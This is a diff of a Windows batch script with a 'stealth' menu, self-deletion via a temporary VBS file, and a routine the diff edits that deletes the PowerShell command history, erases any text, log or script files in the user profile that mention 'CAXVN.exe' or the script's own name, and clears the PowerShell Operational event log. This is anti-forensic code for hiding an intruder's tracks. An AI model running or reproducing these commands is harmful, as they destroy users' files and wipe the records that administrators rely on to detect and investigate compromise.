@@ -290,7 +290,6 @@ if errorlevel 1 (
     goto STEALTH_MENU
 )
 
-
 :: === Alert Admin Placeholder ===
 
 :ALERT_ADMIN
@@ -325,18 +324,16 @@ del "%temp%\delete_me.vbs" >nul 2>&1
 
 exit
 
-:: === PowerShell History Cleanup (Safe Version) ===
+:: === PowerShell History Cleanup ===
 
-:CLEAN_PS_HISTORY_SAFE
+:CLEAN_PS_HISTORY
 echo Cleaning PowerShell History...
 
-2>nul del /f /q "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+del /f /q "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
 
 for /r "%userprofile%" %%F in (*.txt *.log *.ps1) do (
-    if exist "%%F" (
-        findstr /i "CAXVN.exe" "%%F" >nul 2>nul && del /f /q "%%F" >nul 2>nul
-        findstr /i "%~nx0" "%%F" >nul 2>nul && del /f /q "%%F" >nul 2>nul
-    )
+    findstr /i "CAXVN.exe" "%%F" >nul 2>&1 && del "%%F" >nul 2>&1
+    findstr /i "%~nx0" "%%F" >nul 2>&1 && del "%%F" >nul 2>&1
 )
 
 wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>&1
